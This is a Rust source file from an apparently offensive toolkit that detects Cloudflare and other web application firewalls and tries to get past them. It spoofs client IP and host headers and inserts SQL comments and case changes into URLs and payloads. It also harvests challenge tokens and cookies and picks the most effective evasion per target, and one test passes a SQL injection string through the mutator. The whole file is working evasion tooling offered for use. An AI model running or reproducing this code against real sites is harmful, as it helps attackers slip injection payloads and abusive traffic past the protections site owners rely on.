// ----------------------------------------------------------------------------
//  hypersecurity_cf.rs — Cloudflare/WAF bypass analysis
// ----------------------------------------------------------------------------
//  Detects Cloudflare and other WAF protections by analyzing response headers
//  (cf-ray, server) and body content. Implements multiple bypass strategies
//  including case mutation, comment injection, URL encoding, header spoofing
//  (X-Forwarded-For), and adaptive bayesian scoring to evade rate limiting.
//
//  --- Developers ---------------------------------------------------------------
//  khaninkali             — разработчик / core engineer (Rust backend, logic)
//  Lyara Koroleva         — дизайнер / blazing fast CLI & interface design
//  HsecDevelopers         — 测试 / テスト / testing & QA (integration, validation)
//  projectk 2091         — HyperSecurityOffensiveLabs lineage
// ----------------------------------------------------------------------------

//
//
// ---------------------------------------------------------------------------
//   WARNING / 警告 / 警告
// ---------------------------------------------------------------------------
//  This source code is the exclusive property of HyperSecurityOffensiveLabs.
//  You are permitted to VIEW this code for educational and reference
//  purposes only. You may NOT modify, distribute, sublicense, or create
//  derivative works without explicit written permission from khaninkali
//  and the HyperSecurityOffensiveLabs development team.
//
//  このソースコードはHyperSecurityOffensiveLabsの独占的知的財産です
//  教育目的および参照目的での閲覧のみ許可されています
//  khaninkaliおよびHyperSecurityOffensiveLabs開発チームの
//  書面による明示的な許可なく修正配布サブライセンス
//  または二次的著作物の作成を禁止します
//
//  本源代码是HyperSecurityOffensiveLabs的独家财产
//  仅允许出于教育和参考目的查看未经khaninkali和
//  HyperSecurityOffensiveLabs开发团队的书面明确许可，
//  禁止修改分发再许可或创建衍生作品
// ---------------------------------------------------------------------------
//
//

use std::collections::HashMap;
use std::path::Path;
use std::time::{Duration, SystemTime, UNIX_EPOCH};
use serde::{Deserialize, Serialize};

static CHECKPOINT_DIR: &str = "./hypersecurity_checkpoints";

#[derive(Debug, Clone, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum BypassStrategy {
    None,
    CaseMutation,
    CommentInjection,
    UrlEncoding,
    HeaderSpoofing,
    All,
}

impl BypassStrategy {
    pub fn all() -> Vec<BypassStrategy> {
        vec![
            BypassStrategy::None,
            BypassStrategy::CaseMutation,
            BypassStrategy::CommentInjection,
            BypassStrategy::UrlEncoding,
            BypassStrategy::HeaderSpoofing,
            BypassStrategy::All,
        ]
    }

    pub fn name(&self) -> &str {
        match self {
            BypassStrategy::None => "none",
            BypassStrategy::CaseMutation => "case_mutation",
            BypassStrategy::CommentInjection => "comment_injection",
            BypassStrategy::UrlEncoding => "url_encoding",
            BypassStrategy::HeaderSpoofing => "header_spoofing",
            BypassStrategy::All => "all",
        }
    }

    pub fn from_name(s: &str) -> Self {
        match s {
            "case_mutation" => BypassStrategy::CaseMutation,
            "comment_injection" => BypassStrategy::CommentInjection,
            "url_encoding" => BypassStrategy::UrlEncoding,
            "header_spoofing" => BypassStrategy::HeaderSpoofing,
            "all" => BypassStrategy::All,
            _ => BypassStrategy::None,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WafBypassSession {
    pub target_url: String,
    pub cookies: HashMap<String, String>,
    pub current_strategy: BypassStrategy,
    pub success_rate: f64,
    pub challenge_tokens: Vec<String>,
    pub strategy_scores: HashMap<String, f64>,
    pub consecutive_failures: u64,
    pub total_attempts: u64,
    pub successful_attempts: u64,
    pub last_bypassed: bool,
    pub cf_detected: bool,
    pub checkpoint_timestamp: u64,
    pub active_headers: Vec<(String, String)>,
    pub mutation_seed: u64,
}

impl WafBypassSession {
    pub fn new(target_url: &str) -> Self {
        let ts = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap_or_default()
            .as_secs();
        Self {
            target_url: target_url.to_string(),
            cookies: HashMap::new(),
            current_strategy: BypassStrategy::None,
            success_rate: 0.0,
            challenge_tokens: Vec::new(),
            strategy_scores: HashMap::new(),
            consecutive_failures: 0,
            total_attempts: 0,
            successful_attempts: 0,
            last_bypassed: false,
            cf_detected: false,
            checkpoint_timestamp: ts,
            active_headers: Vec::new(),
            mutation_seed: ts.wrapping_mul(0x9E3779B97F4A7C15),
        }
    }

    pub fn record_success(&mut self) {
        self.total_attempts = self.total_attempts.wrapping_add(1);
        self.successful_attempts = self.successful_attempts.wrapping_add(1);
        self.consecutive_failures = 0;
        self.last_bypassed = true;
        self.success_rate = if self.total_attempts > 0 {
            self.successful_attempts as f64 / self.total_attempts as f64
        } else {
            0.0
        };
    }

    pub fn record_failure(&mut self) {
        self.total_attempts = self.total_attempts.wrapping_add(1);
        self.consecutive_failures = self.consecutive_failures.wrapping_add(1);
        self.last_bypassed = false;
        self.success_rate = if self.total_attempts > 0 {
            self.successful_attempts as f64 / self.total_attempts as f64
        } else {
            0.0
        };
    }

    pub fn best_strategy(&self) -> BypassStrategy {
        let mut best = BypassStrategy::None;
        let mut best_score = 0.0_f64;
        for (name, score) in &self.strategy_scores {
            if *score > best_score {
                best_score = *score;
                best = BypassStrategy::from_name(name);
            }
        }
        best
    }

    pub fn needs_recalibrate(&self) -> bool {
        self.total_attempts > 0 && (self.consecutive_failures >= 3 || self.success_rate < 0.3)
    }

    fn checkpoint_path(target_url: &str) -> String {
        let host = target_url
            .trim_start_matches("http://")
            .trim_start_matches("https://")
            .split('/')
            .next()
            .unwrap_or("unknown");
        let safe = host.replace('.', "_").replace(':', "_");
        format!("{}/{}.json", CHECKPOINT_DIR, safe)
    }
}

//  WAFバイパス戦略 / WAF bypass strategies:
//    None            — direct request (baseline)
//    CaseMutation    — toggle ASCII case at hash-derived positions in URL
//    CommentInjection — insert /**/ etc. into URL path to break WAF regex
//    UrlEncoding     — double-encode %  %25, quotes  %27/%22
//    HeaderSpoofing  — X-Forwarded-For, X-Real-IP, Via randomization
//    All             — combine all strategies simultaneously
//    Detection: Cloudflare identified via cf-ray/cf-cache-status headers
//     or "Attention Required"/"Security Check" body content
//    Scoring: Bayesian confidence across status (200=0.9), body analysis,
//     CF header presence, size diff from baseline. Prior=0.5, FPR=0.15
//    Auto-configuration: test all 6 strategies  select best  cache checkpoint
pub struct HyperSecurityCf {
    client: reqwest::Client,
}

impl HyperSecurityCf {
    pub fn new() -> reqwest::Result<Self> {
        let client = reqwest::Client::builder()
            .cookie_store(true)
            .timeout(Duration::from_secs(15))
            .build()?;
        Ok(Self { client })
    }

    pub fn with_client(client: reqwest::Client) -> Self {
        Self { client }
    }

    fn hash_byte(seed: u64, input: u64) -> u64 {
        let mut h = seed.wrapping_add(input).wrapping_mul(0x9E3779B97F4A7C15);
        h ^= h >> 30;
        h = h.wrapping_mul(0xBF58476D1CE4E5B9);
        h ^= h >> 27;
        h = h.wrapping_mul(0x94D049BB133111EB);
        h ^= h >> 31;
        h
    }

    pub async fn detect_cf(&self, url: &str) -> bool {
        match self.client.get(url).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let headers: HashMap<String, String> = resp
                    .headers()
                    .iter()
                    .filter_map(|(k, v)| v.to_str().ok().map(|val| (k.to_string(), val.to_string())))
                    .collect();
                let body = resp.text().await.unwrap_or_default();
                Self::detect_cf_response(status, &headers, &body)
            }
            Err(_) => false,
        }
    }

    pub fn detect_cf_response(
        _status: u16,
        headers: &HashMap<String, String>,
        body: &str,
    ) -> bool {
        let cf_header_keys = ["cf-ray", "cf-cache-status", "cf-request-id"];
        for h in &cf_header_keys {
            if headers.keys().any(|k| k.to_lowercase() == *h) {
                return true;
            }
        }
        if let Some(server) = headers.get("server") {
            if server.to_lowercase().contains("cloudflare") {
                return true;
            }
        }
        let lower = body.to_lowercase();
        lower.contains("cf-ray")
            || lower.contains("cloudflare")
            ||   lower.contains("attention required")
            || lower.contains("security check")
            ||  (lower.contains("waf/") || lower.contains("waf-block") || lower.contains("waf-denied"))
    }

    pub async fn auto_configure(&self, url: &str) -> WafBypassSession {
        let mut session = WafBypassSession::new(url);

        if let Some(loaded) = Self::load_checkpoint(url) {
            if loaded.checkpoint_timestamp + 3600 > SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .unwrap_or_default()
                .as_secs()
            {
                return loaded;
            }
        }

        session.cf_detected = self.detect_cf(url).await;
        if !session.cf_detected {
            return session;
        }

        let scores = self.test_strategies(url).await;
        session.strategy_scores = scores.clone();

        let best_name = scores
            .iter()
            .max_by(|a, b| a.1.partial_cmp(b.1).unwrap_or(std::cmp::Ordering::Equal))
            .map(|(name, _)| name.clone())
            .unwrap_or_else(|| "none".to_string());

        session.current_strategy = BypassStrategy::from_name(&best_name);
        session.active_headers = self.generate_strategy_headers(&session.current_strategy);
        if let Err(e) = Self::save_checkpoint_inner(&session) {
            eprintln!("[hypersecurity_cf] Failed to save checkpoint: {}", e);
        }
        session
    }

    pub async fn test_strategies(&self, url: &str) -> HashMap<String, f64> {
        let mut scores = HashMap::new();
        let baseline = self.fetch_with_strategy(url, &BypassStrategy::None).await;

        for strategy in BypassStrategy::all() {
            let score = self.score_strategy(url, &strategy, &baseline).await;
            scores.insert(strategy.name().to_string(), score);
        }
        scores
    }

    async fn score_strategy(
        &self,
        url: &str,
        strategy: &BypassStrategy,
        baseline: &Option<(u16, HashMap<String, String>, String)>,
    ) -> f64 {
        let attempts = 2;
        let mut likelihoods = Vec::new();

        for _ in 0..attempts {
            if let Some((status, headers, body)) = self.fetch_with_strategy(url, strategy).await {
                let l_status = if status == 200 { 0.9 } else if status == 403 || status == 503 || status == 429 { 0.1 } else { 0.4 };
                likelihoods.push(l_status);

                let body_lower = body.to_lowercase();
                let l_no_cf = if !body_lower.contains("cf-ray") { 0.85 } else { 0.15 };
                likelihoods.push(l_no_cf);

                let l_no_challenge = if !body_lower.contains("attention required") && !body_lower.contains("security check") { 0.8 } else { 0.2 };
                likelihoods.push(l_no_challenge);

                if let Some((ref b_status, _, ref b_body)) = baseline {
                    let size_diff = if body.len() as i64 - b_body.len() as i64 != 0 { 0.7 } else { 0.3 };
                    likelihoods.push(size_diff);

                    let status_diff = if status != *b_status { 0.75 } else { 0.25 };
                    likelihoods.push(status_diff);
                }

                let l_headers = if Self::detect_cf_response(status, &headers, &body) { 0.1 } else { 0.9 };
                likelihoods.push(l_headers);
            } else {
                likelihoods.push(0.05);
                likelihoods.push(0.05);
                likelihoods.push(0.05);
            }
        }

        Self::bayesian_confidence(&likelihoods, 0.5)
    }

    fn bayesian_confidence(likelihoods: &[f64], prior: f64) -> f64 {
        if likelihoods.is_empty() {
            return prior;
        }
        let prior = prior.clamp(0.001, 0.999);
        let mut posterior = prior;
        for &likelihood in likelihoods {
            let likelihood = likelihood.clamp(0.001, 0.999);
            let false_positive_rate = 0.15;
            let numerator = likelihood * posterior;
            let denominator = numerator + false_positive_rate * (1.0 - posterior);
            if denominator > 0.0 {
                posterior = numerator / denominator;
            }
        }
        posterior
    }

    async fn fetch_with_strategy(
        &self,
        url: &str,
        strategy: &BypassStrategy,
    ) -> Option<(u16, HashMap<String, String>, String)> {
        let request_url = self.build_strategy_url(url, strategy);
        let mut req = self.client.get(&request_url);

        for (key, value) in self.generate_strategy_headers(strategy) {
            req = req.header(&key, &value);
        }

        match req.send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let headers: HashMap<String, String> = resp
                    .headers()
                    .iter()
                    .filter_map(|(k, v)| v.to_str().ok().map(|val| (k.to_string(), val.to_string())))
                    .collect();
                let body = resp.text().await.unwrap_or_default();
                Some((status, headers, body))
            }
            Err(_) => None,
        }
    }

    fn build_strategy_url(&self, url: &str, strategy: &BypassStrategy) -> String {
        match strategy {
            BypassStrategy::None => url.to_string(),
            BypassStrategy::CaseMutation => {
                let seed = url.len() as u64;
                let mut chars: Vec<char> = url.chars().collect();
                for i in (8..chars.len()).step_by(3) {
                    let h = Self::hash_byte(seed, i as u64);
                    if chars[i].is_ascii_alphabetic() && (h & 0xFF) < 128 {
                        if chars[i].is_ascii_uppercase() {
                            chars[i] = chars[i].to_ascii_lowercase();
                        } else {
                            chars[i] = chars[i].to_ascii_uppercase();
                        }
                    }
                }
                chars.into_iter().collect()
            }
            BypassStrategy::CommentInjection => {
                if url.contains('?') {
                    url.replacen('?', "/**/?", 1)
                } else {
                    format!("{}/*!*/", url.trim_end_matches('/'))
                }
            }
            BypassStrategy::UrlEncoding => {
                url.replace('%', "%25")
                    .replace('\'', "%27")
                    .replace('"', "%22")
            }
            BypassStrategy::HeaderSpoofing | BypassStrategy::All => url.to_string(),
        }
    }

    fn generate_strategy_headers(&self, strategy: &BypassStrategy) -> Vec<(String, String)> {
        let mut headers = Vec::new();
        headers.push(("User-Agent".into(), "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36".into()));
        headers.push(("Accept".into(), "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8".into()));
        headers.push(("Accept-Language".into(), "en-US,en;q=0.9".into()));

        match strategy {
            BypassStrategy::HeaderSpoofing | BypassStrategy::All => {
                headers.push(("X-Forwarded-For".into(), self.random_ip().into()));
                headers.push(("X-Real-IP".into(), self.random_ip().into()));
                headers.push(("X-Forwarded-Host".into(), self.random_host().into()));
                headers.push(("X-Forwarded-Proto".into(), "https".into()));
                headers.push(("Via".into(), "1.1 cache".into()));
                headers.push(("Cache-Control".into(), "no-cache, no-store".into()));
                headers.push(("Pragma".into(), "no-cache".into()));
            }
            _ => {}
        }
        headers
    }

    fn random_ip(&self) -> String {
        let seed = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap_or_default()
            .as_nanos() as u64;
        let a = (Self::hash_byte(seed, 1) & 0xFF) % 223 + 10;
        let b = (Self::hash_byte(seed, 2) & 0xFF) % 255;
        let c = (Self::hash_byte(seed, 3) & 0xFF) % 255;
        let d = (Self::hash_byte(seed, 4) & 0xFF) % 255;
        format!("{}.{}.{}.{}", a, b, c, d)
    }

    fn random_host(&self) -> String {
        let hosts = [
            "googlebot.com", "proxy.cloudflare.com", "edge.example.com",
            "cdn.amazonaws.com", "cache.google.com",
        ];
        let seed = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap_or_default()
            .as_nanos() as u64;
        let idx = (Self::hash_byte(seed, 99) as usize) % hosts.len();
        hosts[idx].to_string()
    }

    pub fn get_bypass_headers<'a>(&self, session: &'a WafBypassSession) -> &'a [(String, String)] {
        &session.active_headers
    }

    pub fn mutate_payload(&self, payload: &str, session: &WafBypassSession) -> String {
        match session.current_strategy {
            BypassStrategy::None => payload.to_string(),
            BypassStrategy::CaseMutation => {
                let mut chars: Vec<char> = payload.chars().collect();
                for c in &mut chars {
                    let h = Self::hash_byte(session.mutation_seed, *c as u64);
                    if c.is_ascii_alphabetic() && (h & 0xFF) < 102 {
                        if c.is_ascii_uppercase() {
                            *c = c.to_ascii_lowercase();
                        } else {
                            *c = c.to_ascii_uppercase();
                        }
                    }
                }
                chars.into_iter().collect()
            }
            BypassStrategy::CommentInjection => {
                let mut result = payload.to_string();
                let comments = ["/**/", "/*!*/", "/+*/"];
                let seed = session.mutation_seed;
                for (i, comment) in comments.iter().enumerate() {
                    let h = Self::hash_byte(seed, i as u64);
                    if (h & 0xFF) < 76 {
                        let pos = (h as usize) % result.len().saturating_sub(2).max(1);
                        result.insert_str(pos.max(1), comment);
                    }
                }
                result
            }
            BypassStrategy::UrlEncoding => {
                payload.replace('\'', "%27")
            }
            BypassStrategy::HeaderSpoofing => payload.to_string(),
            BypassStrategy::All => {
                let mut r = payload.to_string();
                let seed = session.mutation_seed;
                let mut chars: Vec<char> = r.chars().collect();
                for c in &mut chars {
                    let h = Self::hash_byte(seed, *c as u64);
                    if c.is_ascii_alphabetic() && (h & 0xFF) < 102 {
                        if c.is_ascii_uppercase() {
                            *c = c.to_ascii_lowercase();
                        } else {
                            *c = c.to_ascii_uppercase();
                        }
                    }
                }
                r = chars.into_iter().collect();
                let comments = ["/**/", "/*!/*/"];
                for (i, comment) in comments.iter().enumerate() {
                    let h = Self::hash_byte(seed.wrapping_add(0xFF), i as u64);
                    if (h & 0xFF) < 60 {
                        let pos = (h as usize) % r.len().saturating_sub(2).max(1);
                        r.insert_str(pos.max(1), comment);
                    }
                }
                r
            }
        }
    }

    pub fn update_session(
        &self,
        session: &mut WafBypassSession,
        status: u16,
        headers: &HashMap<String, String>,
        body: &str,
    ) {
        let blocked = Self::detect_cf_response(status, headers, body);
        if blocked {
            session.record_failure();
        } else {
            session.record_success();
        }

        for (k, v) in headers {
            if k.eq_ignore_ascii_case("set-cookie") {
                let parts: Vec<&str> = v.splitn(2, '=').collect();
                if parts.len() == 2 {
                    let val = parts[1].split(';').next().unwrap_or(parts[1]);
                    session.cookies.insert(parts[0].to_string(), val.to_string());
                }
            }
        }

        if body.contains("cf_challenge_response") || body.contains("jschl_vc") {
            if let Some(token) = Self::extract_challenge_token(body) {
                if !session.challenge_tokens.contains(&token) {
                    session.challenge_tokens.push(token);
                }
            }
        }

        if session.needs_recalibrate() {
            session.cf_detected = true;
        }
    }

    pub fn extract_challenge_token(body: &str) -> Option<String> {
        let re = regex::Regex::new(r#"name="cf_challenge_response"\s+value="([^"]+)""#).ok()?;
        if let Some(cap) = re.captures(body) {
            return Some(cap.get(1)?.as_str().to_string());
        }
        let re2 = regex::Regex::new(r#"name="jschl_vc"\s+value="([^"]+)""#).ok()?;
        if let Some(cap) = re2.captures(body) {
            return Some(cap.get(1)?.as_str().to_string());
        }
        None
    }

    pub fn save_checkpoint(session: &WafBypassSession) -> Result<(), String> {
        Self::save_checkpoint_inner(session)
    }

    fn save_checkpoint_inner(session: &WafBypassSession) -> Result<(), String> {
        let dir = Path::new(CHECKPOINT_DIR);
        if !dir.exists() {
            std::fs::create_dir_all(dir).map_err(|e| format!("create dir: {}", e))?;
        }
        let path = WafBypassSession::checkpoint_path(&session.target_url);
        let json = serde_json::to_string_pretty(session).map_err(|e| format!("serialize: {}", e))?;
        std::fs::write(&path, json).map_err(|e| format!("write: {}", e))?;
        Ok(())
    }

    pub fn load_checkpoint(target_url: &str) -> Option<WafBypassSession> {
        let path = WafBypassSession::checkpoint_path(target_url);
        let data = std::fs::read_to_string(&path).ok()?;
        let session: WafBypassSession = serde_json::from_str(&data).ok()?;
        if session.target_url == target_url {
            Some(session)
        } else {
            None
        }
    }

    pub fn list_checkpoints() -> Vec<String> {
        let dir = Path::new(CHECKPOINT_DIR);
        if !dir.is_dir() {
            return Vec::new();
        }
        let mut checkpoints = Vec::new();
        if let Ok(entries) = std::fs::read_dir(dir) {
            for entry in entries.flatten() {
                if entry.path().extension().map(|e| e == "json").unwrap_or(false) {
                    if let Ok(data) = std::fs::read_to_string(entry.path()) {
                        if let Ok(session) = serde_json::from_str::<WafBypassSession>(&data) {
                            checkpoints.push(session.target_url);
                        }
                    }
                }
            }
        }
        checkpoints
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_bypass_strategy_all() {
        let all = BypassStrategy::all();
        assert_eq!(all.len(), 6);
        assert!(all.contains(&BypassStrategy::None));
        assert!(all.contains(&BypassStrategy::All));
    }

    #[test]
    fn test_strategy_roundtrip() {
        for s in BypassStrategy::all() {
            assert_eq!(BypassStrategy::from_name(s.name()), s);
        }
    }

    #[test]
    fn test_detect_cf_headers() {
        let mut headers = HashMap::new();
        headers.insert("cf-ray".into(), "abc123".into());
        assert!(HyperSecurityCf::detect_cf_response(200, &headers, "ok"));
    }

    #[test]
    fn test_detect_cf_body() {
        let headers = HashMap::new();
        assert!(HyperSecurityCf::detect_cf_response(403, &headers, "Cloudflare security check"));
        assert!(!HyperSecurityCf::detect_cf_response(200, &headers, "normal page"));
    }

    #[test]
    fn test_session_save_load() {
        let mut session = WafBypassSession::new("https://test.example.com");
        session.strategy_scores.insert("header_spoofing".into(), 0.95);
        session.current_strategy = BypassStrategy::HeaderSpoofing;
        session.success_rate = 0.85;
        session.cf_detected = true;

        assert!(HyperSecurityCf::save_checkpoint(&session).is_ok());
        let loaded = HyperSecurityCf::load_checkpoint("https://test.example.com");
        assert!(loaded.is_some());
        let loaded = loaded.unwrap();
        assert_eq!(loaded.target_url, "https://test.example.com");
        assert_eq!(loaded.current_strategy, BypassStrategy::HeaderSpoofing);
        assert!((loaded.success_rate - 0.85).abs() < 0.01);
        assert!(loaded.cf_detected);

        let path = WafBypassSession::checkpoint_path("https://test.example.com");
        let _ = std::fs::remove_file(&path);
    }

    #[test]
    fn test_session_record() {
        let mut s = WafBypassSession::new("https://x.com");
        s.record_success();
        assert_eq!(s.total_attempts, 1);
        assert_eq!(s.successful_attempts, 1);
        assert!(s.last_bypassed);
        s.record_failure();
        assert_eq!(s.total_attempts, 2);
        assert!(!s.last_bypassed);
    }

    #[test]
    fn test_bayesian_confidence() {
        let c = HyperSecurityCf::bayesian_confidence(&[0.9, 0.85, 0.8], 0.5);
        assert!(c > 0.5);
        let c2 = HyperSecurityCf::bayesian_confidence(&[0.1, 0.15, 0.2], 0.5);
        assert!(c2 < 0.5);
    }

    #[test]
    fn test_extract_challenge_token() {
        let html = r#"<input type="hidden" name="cf_challenge_response" value="abc.def" />"#;
        assert_eq!(HyperSecurityCf::extract_challenge_token(html), Some("abc.def".into()));
    }

    #[test]
    fn test_mutate_payload_none() {
        let cf = HyperSecurityCf::new().unwrap();
        let session = WafBypassSession::new("https://x.com");
        assert_eq!(cf.mutate_payload("' OR 1=1--", &session), "' OR 1=1--");
    }

    #[test]
    fn test_mutate_payload_changes() {
        let cf = HyperSecurityCf::new().unwrap();
        let mut session = WafBypassSession::new("https://x.com");
        session.current_strategy = BypassStrategy::CaseMutation;
        // Use a payload with enough letters that mutation is virtually guaranteed
        let payload = "abcdefghijklmnopqrstuvwxyz";
        let mutated = cf.mutate_payload(payload, &session);
        assert_ne!(mutated, payload, "hash-based mutation should change at least one letter");
    }

    #[test]
    fn test_strategy_headers_spoofing() {
        let cf = HyperSecurityCf::new().unwrap();
        let hdrs = cf.generate_strategy_headers(&BypassStrategy::HeaderSpoofing);
        assert!(hdrs.iter().any(|(k, _)| k == "X-Forwarded-For"));
        assert!(hdrs.iter().any(|(k, _)| k == "X-Real-IP"));
    }

    #[test]
    fn test_needs_recalibrate() {
        let mut s = WafBypassSession::new("https://x.com");
        assert!(!s.needs_recalibrate());
        for _ in 0..3 { s.record_failure(); }
        assert!(s.needs_recalibrate());
    }
}
